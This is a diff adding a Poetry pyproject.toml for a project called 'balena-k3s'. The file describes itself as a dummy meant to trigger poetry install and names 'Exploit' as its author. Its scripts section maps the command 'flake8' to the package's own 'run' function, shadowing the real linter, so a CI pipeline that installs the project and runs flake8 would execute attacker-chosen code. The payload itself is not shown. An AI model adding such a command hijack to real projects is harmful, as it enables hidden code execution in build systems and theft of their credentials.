@@ -1,0 +1,21 @@
+[tool.poetry]
+name = "balena-k3s"
+version = "0.1.0"
+description = "A dummy project to trigger poetry install"
+authors = ["Exploit <exploit@example.com>"]
+packages = [{include = "balena_k3s"}]
+
+[tool.poetry.dependencies]
+python = "^3.8.1"
+
+[tool.poetry.group.dev.dependencies]
+flake8 = "^6.0.0"
+pydocstyle = "^6.3.0"
+pytest = "^7.4.0"
+
+[tool.poetry.scripts]
+flake8 = "balena_k3s:run"
+
+[build-system]
+requires = ["poetry-core>=1.0.0"]
+build-backend = "poetry.core.masonry.api"
